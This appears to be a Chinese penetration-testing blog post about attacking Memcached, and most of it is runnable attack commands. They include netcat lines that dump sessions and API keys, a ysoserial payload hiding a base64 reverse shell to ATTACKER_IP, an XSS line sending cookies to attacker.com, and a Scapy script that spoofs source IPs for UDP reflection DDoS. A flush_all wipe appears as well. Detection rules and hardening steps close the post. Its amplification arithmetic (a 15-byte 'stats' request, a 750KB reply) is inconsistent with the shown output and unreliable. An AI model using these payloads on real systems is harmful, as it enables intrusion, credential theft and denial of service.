---
title: "Memcached 未授权访问 / UDP 反射放大 / 缓存投毒 / RCE 利用技术"
date: 2026-06-21T08:00:00+08:00
draft: false
weight: 95
description: "Memcached 内存缓存渗透测试：未授权访问数据窃取、UDP 反射放大攻击（51000x）、缓存投毒反序列化链、SSRF Gopher 协议利用与蓝队检测方案"
categories: ["安全", "渗透测试"]
tags: ["Memcached", "未授权访问", "UDP 反射放大", "DDoS", "缓存投毒", "反序列化", "SSRF", "渗透测试"]
---

## 0x00 攻击面总览

Memcached 是高性能内存缓存，默认无认证且 UDP 端口开放，攻击面极大：

| 组件 | 默认端口 | 协议 | 攻击面 |
|------|---------|------|--------|
| Memcached TCP | 11211 | TCP | 未授权访问、数据读写、缓存投毒 |
| Memcached UDP | 11211 | UDP | 反射放大攻击（DDoS） |
| SASL 认证 | 11211 | TCP | 认证绕过（如配置不当） |

**核心威胁模型**：

```
┌───────────────────────────────────────────────────────────────┐
│                    Memcached 攻击面                             │
│                                                               │
│  ┌──────────────────────────────────────────────────────┐     │
│  │  Memcached Server :11211 (TCP + UDP)                  │     │
│  │  默认无认证 / UDP 默认启用                              │     │
│  └──────────────────────┬───────────────────────────────┘     │
│                         │                                     │
│  攻击路径：                                                    │
│  ① TCP :11211 → 未授权访问 → stats/get/set → 数据窃取         │
│  ② TCP :11211 → 缓存投毒 → 反序列化 → RCE                     │
│  ③ UDP :11211 → 反射放大 → DDoS（51000x 放大比）              │
│  ④ SSRF → Gopher 协议 → 操作内部 Memcached                    │
│  ⑤ 缓存 Session → Session 劫持 → 应用层接管                   │
│                                                               │
│  默认风险：                                                    │
│  • 无认证（SASL 需编译时启用 + 配置）                           │
│  • UDP 默认启用                                                │
│  • 监听 0.0.0.0:11211                                         │
│  • 无速率限制                                                  │
└───────────────────────────────────────────────────────────────┘
```

---

## 0x01 服务识别与指纹

### 1.1 Nmap 服务发现

```bash
nmap -sV -sU -p 11211 \
  --script=memcached-info \
  -oN memcached_scan.txt <target>
```

**典型扫描结果**：

```
PORT      STATE SERVICE     VERSION
11211/tcp open  memcached   Memcached 1.6.21
11211/udp open  memcached   Memcached 1.6.21
```

### 1.2 版本指纹

```bash
# TCP 协议获取版本
echo "version" | nc target 11211
# 返回：VERSION 1.6.21

# 获取统计信息
echo "stats" | nc target 11211

# 响应示例
STAT pid 12345
STAT uptime 86400
STAT time 1687234567
STAT version 1.6.21
STAT curr_items 1000
STAT total_items 5000
STAT bytes 1048576
STAT curr_connections 10
STAT total_connections 100
END
```

### 1.3 Shodan / FOFA 搜索语法

```
# Shodan
port:11211 memcached
product:"Memcached"

# FOFA
port="11211" && protocol="memcached"
```

---

## 0x02 未授权访问 — 数据窃取

### 2.1 服务器信息收集

```bash
# 获取完整统计信息
echo "stats" | nc target 11211

# 获取 slab 信息
echo "stats slabs" | nc target 11211

# 获取 item 信息
echo "stats items" | nc target 11211

# 响应示例
STAT items:1:number 100
STAT items:1:age 3600
STAT items:1:evicted 0
STAT items:2:number 50
END
```

### 2.2 枚举缓存键

```bash
# 获取 slab 中的键（需要 LRU crawler 启用）
echo "stats cachedump 1 100" | nc target 11211

# 响应示例
ITEM user_session_abc123 [256 bytes; 1687234567 s]
ITEM api_key_xyz789 [128 bytes; 1687234567 s]
ITEM config_database [64 bytes; 1687234567 s]
END
```

### 2.3 读取缓存数据

```bash
# 读取特定键
echo "get user_session_abc123" | nc target 11211

# 响应示例
VALUE user_session_abc123 0 256
{"user_id": 1, "role": "admin", "session_token": "eyJhbGciOiJIUzI1NiJ9..."}
END

# 读取 API 密钥
echo "get api_key_xyz789" | nc target 11211

# 读取数据库配置
echo "get config_database" | nc target 11211
```

### 2.4 批量读取

```bash
# 批量读取多个键
echo "get key1 key2 key3 key4 key5" | nc target 11211

# 使用 gets（带 CAS 值）
echo "gets key1 key2" | nc target 11211
```

---

## 0x03 缓存投毒 — 反序列化 RCE

### 3.1 Session 劫持

```bash
# 写入恶意 Session
printf "set user_session_victim 0 3600 50\r\n{\"user_id\": 1, \"role\": \"admin\"}\r\n" | nc target 11211
# 返回：STORED

# 覆盖管理员 Session
printf "set admin_session 0 3600 30\r\n{\"role\":\"admin\",\"authenticated\":true}\r\n" | nc target 11211
```

### 3.2 PHP 反序列化链

```bash
# 写入恶意 PHP 序列化对象到缓存
printf "set php_session_abc 0 3600 100\r\nO:8:\"stdClass\":1:{s:4:\"test\";s:10:\"malicious\";}\r\n" | nc target 11211

# 当 PHP 应用从 Memcached 读取 Session 并反序列化时触发
```

### 3.3 Java 反序列化链

```bash
# 写入恶意 Java 序列化对象
# 使用 ysoserial 生成 payload
java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}" > payload.bin

# 将 payload 写入 Memcached
printf "set java_cache_key 0 3600 $(wc -c < payload.bin)\r\n$(cat payload.bin)\r\n" | nc target 11211
```

### 3.4 配置投毒

```bash
# 覆盖应用配置缓存
printf "set app_config 0 86400 50\r\n{\"db_host\":\"attacker.com\",\"db_pass\":\"stolen\"}\r\n" | nc target 11211

# 覆盖 XSS payload 到缓存
printf "set page_content 0 3600 100\r\n<script>document.location='http://attacker.com/steal?c='+document.cookie</script>\r\n" | nc target 11211
```

---

## 0x04 UDP 反射放大攻击 — DDoS

### 4.1 攻击原理

| 属性 | 详情 |
|------|------|
| 放大比 | 最高 51,000x |
| 攻击向量 | UDP 11211 端口 |
| 根因 | UDP 源 IP 可伪造 + 响应远大于请求 |
| 历史案例 | 2018 年 GitHub 遭受 1.35 Tbps DDoS 攻击 |

### 4.2 放大比分析

```
请求（15 字节）：
  stats\r\n

响应（~750KB）：
  STAT pid 12345
  STAT uptime 86400
  STAT time 1687234567
  STAT version 1.6.21
  ...（数百行统计信息）
  END

放大比 = 750KB / 15B ≈ 51,000x
```

### 4.3 Scapy POC

```python
from scapy.all import *

target = "victim_ip"
memcached = "memcached_ip"
port = 11211

# 构造 UDP 反射包
# 源 IP 伪造为受害者
packet = IP(src=target, dst=memcached) / UDP(sport=12345, dport=port) / Raw(load="stats\r\n")

# 发送放大请求
send(packet, count=100)
print(f"[*] Sent 100 UDP packets to {memcached}:{port}")
print(f"[*] Spoofed source: {target}")
print(f"[*] Amplification: ~51000x")
```

### 4.4 hping3 反射测试

```bash
# 测试 UDP 反射（仅用于授权测试）
hping3 -u -p 11211 -d 15 -a victim_ip memcached_ip --flood
```

---

## 0x05 SSRF → Gopher 协议 → Memcached

### 5.1 通过 SSRF 操作内部 Memcached

```bash
# 通过 Gopher 协议写入缓存
curl -s "http://vulnerable.com/ssrf?url=gopher://internal-memcached:11211/_set%2520evil_key%25200%25203600%252013%250Ahacked_data%250A"

# 通过 Gopher 协议读取缓存
curl -s "http://vulnerable.com/ssrf?url=gopher://internal-memcached:11211/_get%2520sensitive_key%250A"

# 通过 Gopher 协议获取统计信息
curl -s "http://vulnerable.com/ssrf?url=gopher://internal-memcached:11211/_stats%250A"
```

### 5.2 Gopher 协议格式

```
gopher://host:port/_COMMAND\r\n

# URL 编码规则
\r\n → %0D%0A
空格 → %20
```

---

## 0x06 数据写入与持久化

### 6.1 基本写入

```bash
# 写入键值对
printf "set mykey 0 3600 11\r\nhello world\r\n" | nc target 11211
# 返回：STORED

# 追加数据
printf "append mykey 0 0 6\r\n more\r\n" | nc target 11211

# 前置数据
printf "prepend mykey 0 0 6\r\nbefore\r\n" | nc target 11211

# 替换已有键
printf "replace mykey 0 3600 5\r\nnewval\r\n" | nc target 11211

# 删除键
printf "delete mykey\r\n" | nc target 11211

# 清空所有缓存
printf "flush_all\r\n" | nc target 11211
```

### 6.2 CAS（Check-And-Set）操作

```bash
# 获取带 CAS 值的键
echo "gets mykey" | nc target 11211
# 返回：VALUE mykey 0 11 12345
# 最后的 12345 是 CAS 值

# 使用 CAS 更新（仅当 CAS 值匹配时）
printf "cas mykey 0 3600 7 12345\r\nupdated\r\n" | nc target 11211
```

---

## 0x07 历史 CVE 漏洞矩阵

| CVE | 类型 | CVSS | 影响 |
|-----|------|------|------|
| CVE-2016-8702 | 堆溢出 | 9.8 | 二进制协议堆缓冲区溢出 |
| CVE-2016-8703 | 堆溢出 | 9.8 | 二进制协议堆缓冲区溢出 |
| CVE-2017-9951 | 堆溢出 | 9.8 | 二进制协议堆缓冲区溢出 |
| CVE-2020-11473 | 堆溢出 | 9.8 | 二进制协议堆缓冲区溢出 |
| CVE-2019-11596 | 整数溢出 | 9.8 | 整数溢出导致堆溢出 |

**CVE-2016-8702/8703/2017-9951/2020-11473 影响范围**：

Memcached 二进制协议处理中的多个堆缓冲区溢出漏洞。攻击者可以发送精心构造的二进制协议数据包触发堆溢出，实现远程代码执行。CVSS 均为 9.8。

---

## 0x08 蓝队检测方案

### 8.1 网络层检测

```yaml
title: Memcached 外部访问检测
id: memcached-external-access
status: experimental
description: 检测来自非内网段的 Memcached 端口访问
logsource:
  category: firewall
detection:
  selection:
    dst_port:
      - 11211
    src_ip|not:
      - "10.0.0.0/8"
      - "172.16.0.0/12"
      - "192.168.0.0/16"
  condition: selection
level: critical
```

```yaml
title: Memcached UDP 反射放大检测
id: memcached-udp-amplification
status: experimental
description: 检测 Memcached UDP 反射放大攻击特征
logsource:
  category: network
detection:
  selection_udp:
    dst_port: 11211
    protocol: "UDP"
  selection_large_response:
    src_port: 11211
    protocol: "UDP"
    bytes_out>10000
  condition: selection_udp or selection_large_response
level: critical
```

### 8.2 审计日志分析

```bash
# 监控 Memcached 连接
netstat -an | grep 11211

# 监控异常 stats 请求
tcpdump -i any port 11211 -c 100

# 监控 UDP 流量异常
tcpdump -i any udp port 11211 -c 100

# 监控缓存投毒行为
# 检查异常 set 操作
tcpdump -i any -A port 11211 | grep -E "(set |flush_all|delete )"
```

### 8.3 加固清单

```
[ ] 禁用 UDP：memcached -U 0
[ ] 绑定到 localhost：memcached -l 127.0.0.1
[ ] 启用 SASL 认证：memcached -S
[ ] 配置防火墙规则限制 11211 端口访问源
[ ] 使用 iptables 阻止 UDP 11211 外部访问：
    iptables -A INPUT -p udp --dport 11211 -s 10.0.0.0/8 -j ACCEPT
    iptables -A INPUT -p udp --dport 11211 -j DROP
[ ] 升级至 Memcached 1.6.x（最新稳定版）
[ ] 配置 Memcached 连接速率限制
[ ] 在前面放置反向代理并启用认证
[ ] 监控异常 stats/set/flush_all 操作
[ ] 定期检查缓存中的敏感数据（Session、API 密钥等）
[ ] 应用层加密缓存数据
[ ] 使用 VPC/网络隔离限制 Memcached 访问
```

---

## 0x09 渗透测试检查清单

```
[ ] 端口扫描：11211 (TCP + UDP)
[ ] Memcached 未授权访问测试（stats 命令）
[ ] 版本信息收集（version 命令）
[ ] Slab/Item 枚举（stats items / stats cachedump）
[ ] 缓存数据读取测试（get 命令）
[ ] 缓存写入测试（set 命令）
[ ] Session 劫持测试
[ ] 缓存投毒测试（反序列化 payload）
[ ] UDP 反射放大测试（stats 命令放大比）
[ ] SSRF → Gopher 协议利用测试
[ ] flush_all 数据清除测试
[ ] 二进制协议漏洞测试（CVE-2016-8702 等）
[ ] UDP 端口开放状态检查
[ ] SASL 认证配置检查
[ ] 网络隔离检查
```

---

## 0x10 小结

Memcached 的攻击面以**未授权访问**和 **UDP 反射放大**为核心。默认配置下无认证、UDP 启用、全网监听，使得任何网络可达的实体都可以直接读写缓存数据。缓存投毒可通过注入恶意序列化对象实现反序列化 RCE，Session 劫持可直接接管应用用户。UDP 反射放大攻击可达 **51,000 倍**放大比，2018 年 GitHub 遭受的 1.35 Tbps DDoS 攻击即利用此向量。蓝队应重点关注：禁用 UDP（`-U 0`）、绑定到 localhost、启用 SASL 认证、配置防火墙规则、升级至最新版本、将异常操作接入监控。
